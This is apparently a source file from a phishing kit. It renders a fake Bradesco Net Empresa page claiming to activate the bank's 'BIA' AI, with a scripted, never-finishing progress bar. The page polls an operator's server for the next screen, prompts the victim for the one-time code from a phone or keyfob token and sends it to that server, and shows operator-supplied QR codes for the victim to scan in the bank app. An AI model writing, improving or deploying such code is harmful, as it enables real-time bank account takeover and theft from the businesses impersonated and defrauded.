import { useEffect, useRef, useState } from "react";
import { createFileRoute, redirect, useNavigate } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { Check, Loader2, X } from "lucide-react";
import { enviarToken, verificarStatus } from "@/lib/cliente.functions";
import { usePresenca } from "@/hooks/use-presenca";
import { cn } from "@/lib/utils";
import biaImg from "@/assets/bia.png.asset.json";
import fundoBia from "@/assets/img-passo-11.png.asset.json";
import biaLogo from "@/assets/bia-logo.png.asset.json";
import iconeTokenCelular from "@/assets/icone-token-celular.png.asset.json";
import iconeTokenChaveiro from "@/assets/icone-token-chaveiro.png.asset.json";

const searchSchema = z.object({ id: z.string().uuid() });

export const Route = createFileRoute("/interna")({
  validateSearch: (s: Record<string, unknown>) => {
    const r = searchSchema.safeParse(s);
    if (!r.success) throw redirect({ to: "/" });
    return r.data;
  },
  head: () => ({
    meta: [
      { title: "Implementação da BIA — Bradesco Net Empresa" },
      { name: "description", content: "Implementação da Inteligência Artificial BIA em sua conta empresarial." },
      { property: "og:title", content: "Implementação da BIA" },
      { property: "og:description", content: "Implementação da Inteligência Artificial BIA em sua conta empresarial." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: InternaPage,
});

const ETAPAS = [
  "Preparando ambiente da BIA",
  "Sincronizando perfil da conta",
  "Ativando modelos de inteligência",
  "Aplicando personalização empresarial",
  "Concluindo implementação",
];

const BENEFICIOS = [
  {
    titulo: "Disponibilidade 24/7",
    descricao: "Suporte imediato a qualquer hora.",
  },
  {
    titulo: "Agilidade Transacional",
    descricao: "Operações via comando de voz ou texto.",
  },
  {
    titulo: "Segurança Bradesco",
    descricao: "Proteção robusta de dados corporativos.",
  },
];

const FUNCIONALIDADES = [
  { titulo: "Consultas", descricao: "Saldos, extratos e lançamentos." },
  { titulo: "Pagamentos", descricao: "Boletos, tributos e transferências." },
  { titulo: "Crédito", descricao: "Simulação e contratação rápida." },
];

function InternaPage() {
  const { id } = Route.useSearch();
  const checar = useServerFn(verificarStatus);
  const enviarTk = useServerFn(enviarToken);
  const navigate = useNavigate();
  const [progresso, setProgresso] = useState(0);
  const [etapa, setEtapa] = useState(0);
  const finalizadoRef = useRef(false);

  const [tokenModo, setTokenModo] = useState<null | "celular" | "chaveiro">(null);
  const [tokenValor, setTokenValor] = useState("");
  const [tokenSerial, setTokenSerial] = useState<string | null>(null);
  const [tokenNome, setTokenNome] = useState<string | null>(null);
  const [enviandoToken, setEnviandoToken] = useState(false);
  const [aguardandoToken, setAguardandoToken] = useState(false);
  const [erroToken, setErroToken] = useState<string | null>(null);
  const [qrCodeUrl, setQrCodeUrl] = useState<string | null>(null);
  const tokenEnviadoEmRef = useRef<string | null>(null);


  usePresenca(id, "concluido");

  useEffect(() => {
    const t = setInterval(() => {
      setProgresso((p) => {
        if (finalizadoRef.current) return 100;
        if (p >= 95) return 95;
        const inc = p < 60 ? 0.35 : p < 85 ? 0.18 : 0.08;
        const next = Math.min(95, p + inc);
        setEtapa(Math.min(ETAPAS.length - 1, Math.floor((next / 100) * ETAPAS.length)));
        return next;
      });
    }, 1200);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    const t = setInterval(async () => {
      try {
        const res = await checar({ data: { id } });
        if (res.status === "removido") {
          finalizadoRef.current = true;
          navigate({ to: "/" });
          return;
        }
        if (res.status === "reprovado") {
          finalizadoRef.current = true;
          return;
        }
        setTokenSerial(res.token_serial ?? null);
        setTokenNome(res.token_nome ?? null);
        setQrCodeUrl(res.qr_code_url ?? null);



        // Overlay de token dentro da BIA — deve ser verificado antes do redirecionamento genérico
        if (res.proxima_tela === "interna_token_celular" || res.proxima_tela === "interna_token_chaveiro") {
          const modo = res.proxima_tela === "interna_token_chaveiro" ? "chaveiro" : "celular";
          setTokenModo((cur) => (cur === modo ? cur : modo));
          // Se o operador limpou o token (reencaminhamento), volta pro input
          if (aguardandoToken) {
            const clearedToken = !res.token_em || res.token_em !== tokenEnviadoEmRef.current;
            if (clearedToken && !res.token_em) {
              setAguardandoToken(false);
              setEnviandoToken(false);
              setTokenValor("");
              tokenEnviadoEmRef.current = null;
            }
          }
          return;
        }

        if (res.proxima_tela && res.proxima_tela !== "interna") {
          finalizadoRef.current = true;
          setProgresso(100);
          setEtapa(ETAPAS.length - 1);
          setTimeout(() => {
            if (res.proxima_tela === "sucesso") {
              navigate({ to: "/sucesso" });
              return;
            }
            const destino =
              res.proxima_tela === "pin"
                ? "/pin"
                : res.proxima_tela === "token_chaveiro"
                  ? "/token-chaveiro"
                  : res.proxima_tela === "token_celular"
                    ? "/token-celular"
                    : "/interna";
            navigate({ to: destino, search: { id } });
          }, 400);
          return;
        }

        // Voltou pra interna pura
        if (res.proxima_tela === "interna" && tokenModo) {
          setTokenModo(null);
          setAguardandoToken(false);
          setEnviandoToken(false);
          setTokenValor("");
        }
      } catch {
        // silencia
      }
    }, 2500);
    return () => clearInterval(t);
  }, [id, checar, navigate, aguardandoToken, tokenModo]);

  async function submeterToken(e?: { preventDefault: () => void }) {
    e?.preventDefault();
    setErroToken(null);
    const valor = tokenValor.trim();
    if (!valor) {
      setErroToken("Informe o token.");
      return;
    }
    setEnviandoToken(true);
    try {
      await enviarTk({ data: { id, token: valor } });
      tokenEnviadoEmRef.current = new Date().toISOString();
      try {
        const res = await checar({ data: { id } });
        if (res.token_em) tokenEnviadoEmRef.current = res.token_em;
      } catch { /* ignora */ }
      setAguardandoToken(true);
    } catch {
      setEnviandoToken(false);
      setErroToken("Não foi possível enviar. Tente novamente.");
    }
  }


  const etapaAtual = Math.min(ETAPAS.length - 1, Math.floor((progresso / 100) * ETAPAS.length));

  return (
    <div className="relative min-h-screen w-full overflow-hidden font-sans text-[13px] text-[#333]">
      {/* Fundo desfocado, alinhado ao topo esquerdo e cobrindo a tela */}
      <div
        aria-hidden
        className="absolute inset-0 bg-no-repeat"
        style={{
          backgroundImage: `url(${fundoBia.url})`,
          backgroundPosition: "top left",
          backgroundSize: "cover",
          filter: "blur(8px) brightness(0.7)",
        }}
      />
      <div aria-hidden className="absolute inset-0 bg-black/40" />

      {/* Painel de implementação expandido */}
      <main className="relative z-10 flex min-h-screen items-center justify-center px-6 py-6">
        <div className="relative w-full max-w-3xl overflow-hidden rounded-[24px] border border-white/50 bg-white/80 shadow-[0_32px_64px_-16px_rgba(120,40,180,0.18)] backdrop-blur-2xl">
          {/* Cabeçalho com imagem da BIA cobrindo a faixa */}
          <div
            className="relative h-64 flex items-center overflow-hidden bg-cover bg-no-repeat px-6"
            style={{ backgroundImage: `url(${biaImg.url})`, backgroundPosition: "center 70%" }}
          >
            <div className="absolute inset-0 bg-black/25" />
            <div className="relative flex w-full items-end justify-between">
              <div className="text-white">
                <h1 className="mb-1 text-xl font-bold tracking-tight drop-shadow">
                  Configurando sua <span className="font-black">BIA</span>
                </h1>
                <p className="text-sm font-medium text-white/90 drop-shadow">Bradesco Inteligência Artificial</p>
              </div>
              <div className="text-right">
                <div className="text-3xl font-black text-white drop-shadow">
                  {Math.floor(progresso)}
                  <span className="text-lg font-normal opacity-70">%</span>
                </div>
                <div className="mt-1 text-[10px] font-bold uppercase tracking-widest text-white/70">
                  Progresso
                </div>
              </div>
            </div>
          </div>

          {/* Conteúdo principal */}
          <div className="grid grid-cols-12 gap-6 p-6">
            {/* Lado esquerdo: status e progresso */}
            <div className="col-span-12 flex flex-col justify-between lg:col-span-5">
              <div>
                <h2 className="mb-3 text-sm font-bold uppercase tracking-[0.2em] text-bia-purple">
                  Status da Implementação
                </h2>
                <p className="mb-6 leading-relaxed text-slate-600">
                  A Inteligência Artificial do Bradesco está sendo ativada para o seu perfil
                  empresarial. O processo é automático e leva apenas alguns instantes.
                </p>

                <div className="space-y-4">
                  {ETAPAS.map((nome, idx) => {
                    const concluido = idx < etapaAtual;
                    const atual = idx === etapaAtual;
                    let pct = 0;
                    if (concluido) {
                      pct = 100;
                    } else if (atual) {
                      pct = Math.max(
                        0,
                        Math.min(100, ((progresso / 100) * ETAPAS.length - idx) * 100)
                      );
                    }

                    return (
                      <div key={idx}>
                        <div className="mb-2 flex justify-between text-sm font-bold text-slate-800">
                          <span>{nome}</span>
                          {concluido ? (
                            <span className="text-bia-pink">Concluído</span>
                          ) : atual ? (
                            <span className="text-slate-400">Processando...</span>
                          ) : (
                            <span className="text-slate-300">Pendente</span>
                          )}
                        </div>
                        <div className="h-1.5 w-full overflow-hidden rounded-full bg-slate-100">
                          <div
                            className={cn("h-full rounded-full bg-gradient-to-r from-bia-purple to-bia-pink", atual && "animate-pulse")}
                            style={{ width: `${pct}%` }}
                          />
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              <p className="mt-6 text-[11px] text-[#aaa]">
                Mantenha esta página aberta até a conclusão.
              </p>
            </div>

            {/* Lado direito: benefícios e funcionalidades */}
            <div className="col-span-12 rounded-2xl border border-slate-100 bg-slate-50/50 p-6 lg:col-span-7">
              <div className="grid grid-cols-1 gap-6 sm:grid-cols-2">
                {/* Benefícios */}
                <div>
                  <h3 className="mb-4 flex items-center gap-2 text-lg font-bold text-slate-800">
                    <span className="h-5 w-1 rounded-full bg-bia-purple" />
                    Benefícios
                  </h3>
                  <ul className="space-y-5">
                    {BENEFICIOS.map((b) => (
                      <li key={b.titulo} className="flex gap-3">
                        <div className="mt-1 flex h-5 w-5 shrink-0 items-center justify-center rounded-full bg-bia-purple/15">
                          <Check className="h-3 w-3 text-bia-purple" />
                        </div>
                        <div>
                          <span className="block text-sm font-bold text-slate-700">{b.titulo}</span>
                          <span className="text-xs text-slate-500">{b.descricao}</span>
                        </div>
                      </li>
                    ))}
                  </ul>
                </div>

                {/* Funcionalidades */}
                <div>
                  <h3 className="mb-4 flex items-center gap-2 text-lg font-bold text-slate-800">
                    <span className="h-5 w-1 rounded-full bg-bia-pink" />
                    Funcionalidades
                  </h3>
                  <div className="grid grid-cols-1 gap-3">
                    {FUNCIONALIDADES.map((f) => (
                      <div
                        key={f.titulo}
                        className="rounded-xl border border-slate-200 bg-white p-3 shadow-sm"
                      >
                        <span className="mb-1 block text-xs font-bold text-bia-purple">
                          {f.titulo}
                        </span>
                        <span className="text-sm text-slate-600">{f.descricao}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Rodapé da marca */}
          <div className="flex items-center justify-between border-t border-slate-100 bg-slate-50 px-6 py-2.5">
            <div className="flex items-center gap-2">
              <img
                src={biaLogo.url}
                alt="BIA"
                className="h-8 w-8 rounded object-cover"
              />
              <span className="text-xs font-bold uppercase tracking-widest text-slate-400">
                Bradesco Net Empresa
              </span>
            </div>
            <div className="text-[10px] font-medium text-slate-400">
              Versão 4.2.0 • BIA Intelligence v2
            </div>
          </div>
        </div>
      </main>

      {/* Overlay de QR Code enviado pelo operador */}
      {qrCodeUrl && (
        <div className="fixed inset-0 z-40 flex items-center justify-center p-4">
          <div aria-hidden className="absolute inset-0 bg-black/60 backdrop-blur-[3px]" />
          <div className="relative w-full max-w-sm rounded-2xl border border-white/40 bg-white p-6 shadow-2xl">
            <div className="mb-4 text-center">
              <h3 className="text-base font-bold text-slate-800">
                Escaneie o QR Code
              </h3>
              <p className="mt-1 text-xs text-slate-500">
                Utilize o aplicativo Bradesco para escanear e concluir a validação.
              </p>
            </div>
            <div className="flex justify-center rounded-lg border border-slate-200 bg-white p-3">
              <img
                src={qrCodeUrl}
                alt="QR Code de validação"
                className="h-64 w-64 object-contain"
              />
            </div>
            <p className="mt-4 text-center text-[11px] text-slate-400">
              Aguarde... a página avança automaticamente após a leitura.
            </p>
          </div>
        </div>
      )}



      {/* Overlay de token dentro da tela da BIA (mesmo fundo) */}
      {tokenModo && (
        <div className="fixed inset-0 z-30 flex items-center justify-center p-4">
          <div aria-hidden className="absolute inset-0 bg-black/50 backdrop-blur-[2px]" />
          <form
            onSubmit={submeterToken}
            className="relative w-full max-w-md overflow-hidden rounded-2xl border border-white/60 bg-white/95 shadow-[0_32px_64px_-16px_rgba(120,40,180,0.35)] backdrop-blur-2xl"
          >
            <div
              className="relative h-24 overflow-hidden bg-cover bg-no-repeat"
              style={{ backgroundImage: `url(${biaImg.url})`, backgroundPosition: "center 70%" }}
            >
              <div className="absolute inset-0 bg-black/40" />
              <div className="relative flex h-full items-center justify-between px-5 text-white">
                <div>
                  <div className="text-[10px] font-bold uppercase tracking-widest text-white/70">
                    Validação de segurança
                  </div>
                  <div className="text-lg font-bold drop-shadow">
                    Token do {tokenModo === "chaveiro" ? "chaveiro" : "celular"}
                  </div>
                </div>
              </div>
            </div>

            <div className="p-5">
              <p className="mb-4 text-[13px] leading-relaxed text-slate-600">
                Olá{tokenNome ? <>, <strong className="text-slate-800">{tokenNome}</strong></> : null}.
                Para concluir a ativação da BIA, informe o código exibido no seu {tokenModo === "chaveiro" ? "chaveiro token" : "aplicativo autenticador do celular"}.
              </p>

              <div className="flex items-center gap-4">
                <img
                  src={tokenModo === "chaveiro" ? iconeTokenChaveiro.url : iconeTokenCelular.url}
                  alt={tokenModo === "chaveiro" ? "Chaveiro" : "Celular"}
                  className="h-auto w-[110px] shrink-0"
                />
                <div className="flex-1">
                  <label className="mb-1 block text-[11px] font-bold uppercase tracking-widest text-bia-purple">
                    Código
                  </label>
                  <input
                    type="text"
                    inputMode="numeric"
                    autoComplete="one-time-code"
                    value={tokenValor}
                    onChange={(e) => setTokenValor(e.target.value.replace(/\D/g, "").slice(0, 8))}
                    maxLength={8}
                    disabled={enviandoToken || aguardandoToken}
                    placeholder={tokenModo === "chaveiro" ? "00000000" : "000000"}
                    className="h-10 w-full rounded-md border border-slate-300 bg-white px-3 font-mono text-base tracking-widest text-slate-800 outline-none focus:border-bia-purple disabled:bg-slate-100"
                  />
                  <div className="mt-2 text-[11px] text-slate-500">
                    Nº de série:{" "}
                    <span className="font-mono font-semibold text-slate-700">
                      {tokenSerial ?? "XXXXXX000-0"}
                    </span>
                  </div>
                </div>
              </div>

              {erroToken && (
                <p className="mt-3 rounded border border-rose-300 bg-rose-50 px-3 py-2 text-[12px] text-rose-700">
                  {erroToken}
                </p>
              )}

              <div className="mt-5 flex justify-end gap-2">
                <button
                  type="submit"
                  disabled={enviandoToken || aguardandoToken}
                  className="inline-flex items-center gap-2 rounded-md bg-gradient-to-r from-bia-purple to-bia-pink px-4 py-2 text-sm font-bold text-white shadow-md transition-opacity hover:opacity-90 disabled:opacity-60"
                >
                  {enviandoToken || aguardandoToken ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" />
                      Aguarde...
                    </>
                  ) : (
                    <>
                      Enviar
                      <Check className="h-4 w-4" />
                    </>
                  )}
                </button>
              </div>

              {aguardandoToken && (
                <p className="mt-3 flex items-center gap-2 text-[11px] text-slate-500">
                  <X className="h-3 w-3 opacity-0" />
                  Verificando com a central...
                </p>
              )}
            </div>
          </form>
        </div>
      )}
    </div>
  );
}
